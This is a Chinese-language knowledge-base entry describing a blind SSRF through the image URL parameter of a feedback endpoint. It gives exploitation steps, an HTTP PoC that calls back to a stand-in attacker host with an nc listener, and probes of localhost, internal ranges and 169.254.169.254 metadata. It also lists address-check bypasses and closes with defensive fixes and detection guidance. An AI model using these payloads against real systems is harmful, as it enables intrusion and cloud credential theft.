---
id: web-generic-ssrf-feedback-image-url-fetch
title: 意见反馈图片 URL 由服务端抓取：盲 SSRF 外带回连与内网探测
type: scenario
domain: web
path: web/generic/ssrf
technique: feedback-image-url-server-side-fetch-ssrf
tags:
- web
- ssrf
- image
- feedback
- blind-ssrf
- url-fetch
- internal-network
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:37+08:00'
  notes: '已对照原文与 img03-06 核对：POST /listener/feedbackQuestion 的 image 参数被服务端抓取，VPS 收到 GET / 与 User-Agent: shumei，响应 code=100102；原文仅证明外带回连，未打通内网读取，confidence medium 保留；未复跑。'
url: /docs/web/generic/ssrf/web-generic-ssrf-feedback-image-url-fetch/
draft: false
kb_aliases:
- 反馈图片 SSRF
- image 参数 SSRF
- 服务端抓取图片 URL
- 盲 SSRF 外带
- 图片审核服务 SSRF
---

## 一句话结论

意见反馈接口 `POST /listener/feedbackQuestion` 的 `image` 参数接受 URL，服务端会（例如交给图片审核/处理服务）抓取该地址；把 URL 换成攻击者 VPS 即可收到服务器发起的 HTTP 请求，形成盲 SSRF，可进一步用于内网探测或云元数据访问。

## 原理

- 反馈表单允许“添加图片”，客户端把图片以 URL 形式提交到 `image` 字段；服务端为了审核/转存/压缩，会使用 HTTP 客户端（原文请求头 `User-Agent: shumei`，指向内容审核服务）抓取该 URL。
- 服务端发起请求时使用的是目标服务器的网络位置，能访问攻击者不可达的内网地址、容器网段或云元数据端点；攻击者通过自己 VPS 监听即可确认请求是否发出（盲 SSRF）。
- 原文虽然返回 `{"code":100102,"msg":"图片涉嫌违规，请重新上传"}`，但 VPS 已收到 `GET / HTTP/1.1`，说明审核/抓取动作先于业务校验发生，错误提示不影响 SSRF。
- 若抓取组件没有禁用内网/回环/链路本地地址、允许重定向，则盲 SSRF 可以升级为内网端口扫描、访问仅内网服务或读取云元数据；若响应内容被回显到页面，则升级为回显 SSRF。
- 本质是“用户可控 URL 直接进入服务端 HTTP 客户端”，且抓取目标未做地址白名单/私网校验。

## 触发条件

- 存在接受图片 URL 并由服务端抓取的功能（意见反馈、头像、图片审核、远程转存、预览等）。
- 抓取组件未校验/未阻断私网、回环、链路本地、云元数据地址，或校验可被重定向/DNS rebinding 绕过。
- 攻击者能访问该功能入口（部分场景需登录），并能控制 URL。
- 目标可出网访问攻击者地址，或可访问内网目标（盲打）。

## 利用步骤

1. 找到带图片 URL 参数的反馈/上传接口，抓取请求，确认参数名（原文为 `image`）。
2. 把图片 URL 换成自己 VPS 的地址（如 `http://attacker:8889/`），在 VPS 上 `nc -lvp 8889` 监听。
3. 提交请求，观察 VPS 是否收到目标服务器发起的 HTTP 请求（原文收到 `GET /` 与 `User-Agent: shumei`）。
4. 盲 SSRF 探测：把 URL 换成 `http://127.0.0.1:<port>/`、内网网段、`169.254.169.254` 等，通过响应时间差、错误码、长度差异或 DNS 日志判断连通性。
5. 若抓取组件允许重定向，可用攻击者 302 跳转到内网地址；若响应有回显，则直接读取内容。

## PoC

```http
POST /listener/feedbackQuestion?userId=950485 HTTP/1.1
Host: target
Content-Type: application/json
Cookie: <会话>

{"type":"<反馈类型>","contact":"1","opinion":"test","image":"http://attacker:8889/"}
```

VPS 监听端收到（原文）：

```text
GET / HTTP/1.1
Host: attacker:8889
User-Agent: shumei
Accept-Encoding: gzip
```

业务响应可能仍为 `{"code":100102,"msg":"图片涉嫌违规，请重新上传","data":null}`，但请求已由目标服务器发出。

## 变体与关联

- 变体：内网地址写法（十进制/八进制 IP、IPv6 映射、`localhost`、`127.1`、DNS rebinding、302 跳转）用于绕过地址校验。
- 变体：若审核服务支持 `file://`、`gopher://` 等协议，可进一步读取本地文件或探测内网服务；需按实际客户端支持情况测试。
- 关联：[[web-generic-ssrf-avatar-urlopen-internal-service]]（远程头像 URL 抓取 SSRF，侧重回显读取内网服务）、[[web-generic-ssrf-ip-notation-blacklist-bypass]]、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（有校验时的绕过）。
- 边界：抓取组件禁止私网/元数据地址、禁止重定向、只允许白名单域名，或服务端无法出网时，SSRF 影响受限；原文仅证明外带回连，未打通内网读取。

## 检测与防御

- 修复：对用户提交的图片 URL 解析后校验 scheme 与主机，解析 DNS 并阻断私网/回环/链路本地/保留地址；连接时再次校验实际 IP，防止 DNS rebinding。
- 加固：禁止跟随重定向或对每一跳重新校验；设置超时与响应大小上限；图片抓取走隔离的代理/沙箱网络；只允许白名单图片域名或改为客户端直传对象存储。
- 检测：抓取目标为 127.0.0.1、私网段、169.254.169.254、容器网段或非常规端口；同一账号短时间提交多个内网 URL；图片审核服务出现异常出站请求与 DNS 查询。
- 响应：排查审核/抓取服务的出站日志，确认是否访问过内网敏感地址，必要时轮换云凭证并收紧网络策略。
